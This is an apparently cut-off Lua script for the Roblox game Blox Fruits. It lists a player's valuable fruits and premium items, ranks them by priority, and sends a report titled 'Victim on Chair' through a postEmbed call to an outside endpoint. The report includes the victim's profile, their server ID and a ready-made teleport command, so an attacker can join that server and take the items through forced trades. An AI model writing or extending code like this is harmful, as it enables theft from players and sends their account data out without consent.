local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
local function getInventory()
    if not CommF then return nil end
    local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
    return ok and inv or nil
end
local function isFruit(item)
    if not item then return false end
    if item.Type == "Blox Fruit" then return true end
    return norm(item.Name):find("fruit", 1, true) ~= nil
end
local function isPremium(item)
    if not item then return false end
    if item.Type == "Premium" then return true end
    local n = norm(item.Name)
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return true end
    for _, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return true end end
    return false
end
local function priorityRank(item)
    local n = norm(item.Name)
    for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
    for i, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return 100 + i end end
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return 500 end
    if item.Type == "Blox Fruit" then return 600 end
    return 999
end
local function collectTradeable()
    local inv = getInventory()
    if not inv then return {} end
    local out = {}
    for _, item in ipairs(inv) do
        if isFruit(item) or isPremium(item) then out[#out + 1] = item end
    end
    table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
    return out
end

local function sendInventoryEmbed(reason)
    local inv = getInventory()
    if not inv then return end
    local fruitLines, premiumLines = {}, {}
    local allTradeable = {}
    for _, item in ipairs(inv) do
        if isFruit(item) or isPremium(item) then allTradeable[#allTradeable + 1] = item end
    end
    table.sort(allTradeable, function(a, b) return priorityRank(a) < priorityRank(b) end)

    for i, item in ipairs(allTradeable) do
        local line = string.format("[%02d] %s (x%d)", i, tostring(item.Name):gsub("-", " "), item.Count or 1)
        if isPremium(item) then premiumLines[#premiumLines + 1] = line
        else fruitLines[#fruitLines + 1] = line end
    end
    if #fruitLines == 0 then fruitLines = { "None" } end
    if #premiumLines == 0 then premiumLines = { "None" } end

    local joinScript = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, game.JobId)

    postEmbed({
        title = "🍇 Blox Fruits — Victim on Chair",
        description = string.format("**Victim:** [%s](https://www.roblox.com/users/%d/profile)\n**Server:** `%s`\n**Reason:** %s", LP.Name, LP.UserId, game.JobId, reason or "Auto-Trade"),
        color = 0xFF0000, 
        thumbnail = { url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", LP.UserId) },
        fields = {
            { name = "⚡ Fruits (Priority)", value = "```lua\n" .. table.concat(fruitLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
            { name = "💎 Premium / Skins", value = "```lua\n" .. table.concat(premiumLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
